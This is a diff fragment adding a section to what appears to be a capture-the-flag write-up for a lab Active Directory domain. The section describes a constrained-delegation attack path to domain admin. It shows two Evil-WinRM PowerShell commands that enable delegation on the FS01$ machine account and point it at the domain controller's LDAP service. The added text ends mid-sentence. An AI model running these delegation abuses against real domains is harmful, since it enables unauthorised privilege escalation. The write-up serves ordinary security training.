@@ -546,5 +546,11 @@ I now have an active session on the domain controller
 # Domain admin
 
 ## Resource based constrained delegation
+Here i cannot make a computer account because the maq is set to 0 so ill have to set this up with `FS01$`
 
+```python
+*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop> Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
+*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop> Set-ADObject -Identity "CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL" -Add @{"msDS-AllowedToDelegateTo"="ldap/dc.redelegate.vl"}
+```
+This setip
 
